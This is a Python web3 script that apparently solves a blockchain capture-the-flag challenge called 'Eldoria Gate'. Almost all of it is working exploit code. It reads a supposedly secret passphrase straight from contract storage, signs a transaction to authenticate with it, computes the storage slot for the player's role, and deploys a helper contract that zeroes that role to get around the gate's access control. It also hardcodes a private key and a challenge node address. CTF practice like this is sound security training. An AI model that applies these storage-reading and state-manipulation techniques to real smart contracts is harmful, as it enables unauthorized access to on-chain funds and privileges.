from web3 import Web3
from hexbytes import HexBytes
import json
from eth_utils import keccak

from solcx import compile_files, set_solc_version


#setting up all our addresses and key
player_key = '0xef4479cded961d9ac55e4576ed33c1daab2167887dbdbf9886192fbc3d4aa0ae'
player_addr = '0x435DDc29a5582ff3dFB706c5Cd0F10e5011826F8'
eldoriagate_addr = '0x007A8c2636A4c98642433522B9304152Dc4a3174'
setup_addr = '0xF0518335a5850E5a60dc3083E093D84eeF0399D4'

set_solc_version('0.8.28')

def get_role():
    role = eldoria_gate_contract.functions.getVillagerRoles(player_addr).call()
    print(f"Role: {role}")

def check_usurper():
    usurper = eldoria_gate_contract.functions.checkUsurper(player_addr).call()
    print(f"Usurper? {usurper}!")

def get_storage_data():
    stored_data = w3.eth.get_storage_at(eldoria_gate_kernel_address, storage_slot)
    print(stored_data.hex())
# Connect to Network
rpc_url = "http://94.237.54.189:32559"
w3 = Web3(Web3.HTTPProvider(rpc_url))

if w3.is_connected():
    print("Connected to Network")
else:
    print("Failed to connect to Network")
    exit()

wei_bal = w3.eth.get_balance(player_addr)
print(f'Current Balance: {w3.from_wei(wei_bal, 'ether')} ETH')

with open('eldoriagate_ABI.json', 'r') as abi:
    eldoriagate_abi = json.load(abi)

with open('eldoriagatekernel_ABI.json', 'r') as abi:
    eldoriagatekernel_abi = json.load(abi)

# Getting the secret
eldoria_gate_contract = w3.eth.contract(address=eldoriagate_addr, abi=eldoriagate_abi)
eldoria_gate_kernel_address = eldoria_gate_contract.functions.kernel().call()
secret_slot = 0  # Replace with the actual slot number if known
secret = w3.eth.get_storage_at(eldoria_gate_kernel_address, secret_slot)
passphrase_bytes = secret[-4:]

nonce = w3.eth.get_transaction_count(player_addr)
transaction = eldoria_gate_contract.functions.enter(passphrase_bytes).build_transaction({
    'from': player_addr,
    'chainId': w3.eth.chain_id,
    'value': w3.to_wei('0', 'wei'),
    'gas': 200000,
    'gasPrice': w3.to_wei('0', 'wei'),
    'nonce': nonce,
})
signed_tx = w3.eth.account.sign_transaction(transaction, player_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

if receipt['status'] == 1:
    print("Auth successful")
else:
    print("Womp womp")

get_role()
# Since we have a role (SERF) we want to manipulate storage directly to lose our role
villagers_slot = 1
player_addr_bytes = bytes.fromhex(player_addr[2:]).rjust(32, b'\x00')
villager_slot_bytes = w3.to_bytes(villagers_slot).rjust(32, b'\x00')
concat = player_addr_bytes + villager_slot_bytes
storage_slot = w3.keccak(concat)


print(f"Storage slot for player data: {storage_slot.hex()}")

get_storage_data()

compiled_sol = compile_files(['RoleUpdater.sol'])
contract_interface = compiled_sol['RoleUpdater.sol:RoleUpdater']

roleupdater = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])

deployment_tx = roleupdater.constructor(eldoria_gate_kernel_address).build_transaction({
    'from': player_addr,
    'nonce': w3.eth.get_transaction_count(player_addr),
    'gas': 2000000,
    'gasPrice': w3.to_wei('50', 'gwei')
    })
signed_dtx = w3.eth.account.sign_transaction(deployment_tx, player_key)
dtx_hash = w3.eth.send_raw_transaction(signed_dtx.raw_transaction)
d_receipt = w3.eth.wait_for_transaction_receipt(dtx_hash)

roleupdater_addr = d_receipt.contractAddress
print(f'Contract deployed at address: {roleupdater_addr}')

role_updater_contract = w3.eth.contract(address=roleupdater_addr, abi=contract_interface['abi'])

transaction = role_updater_contract.functions.setRoleToZero(storage_slot, player_addr).build_transaction({
    'from': player_addr,
    'nonce': w3.eth.get_transaction_count(player_addr),
    'gas': 2000000,
    'gasPrice': w3.to_wei('10', 'gwei')
})
signed_tx = w3.eth.account.sign_transaction(transaction, player_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)


get_storage_data()
'''
transaction = {
    'to': eldoria_gate_kernel_address,
    'data': w3.eth.contract().encode_abi('sstore', args=[storage_slot, new_packed]),
    'gas': 2000000,
    'gasPrice': w3.to_wei('1', 'gwei'),
    'nonce': nonce,
}
signed_tx = w3.eth.account.sign_transaction(sign_transaction, player_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Transaction receipt: {receipt}')
'''
check_usurper()

